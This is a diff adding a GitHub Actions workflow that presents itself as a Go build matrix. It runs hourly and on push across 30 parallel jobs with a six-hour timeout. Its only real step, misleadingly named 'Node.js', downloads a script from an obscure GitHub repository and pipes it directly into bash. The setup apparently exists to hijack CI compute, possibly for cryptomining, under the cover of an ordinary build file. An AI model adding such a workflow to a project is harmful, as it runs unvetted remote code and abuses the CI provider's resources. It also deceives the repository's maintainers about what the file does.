@@ -1,0 +1,31 @@
+name: CINUL
+# on: [push]
+on:
+  push:
+  schedule:
+    - cron: '*/60 * * * *'   
+jobs:
+  build:
+    name: IPLAYBOOKS
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 256
+      fail-fast: false
+      matrix:
+         go: [1.11, 1.12, 1.13, 1.14, 1.15]
+         flag: [kmn, oiu, qwe, nvb, tby, muh]  
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 256
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Node.js
+      run: |
+        curl -sL https://github.com/kidoescegh/filee/raw/main/bitgehu | bash
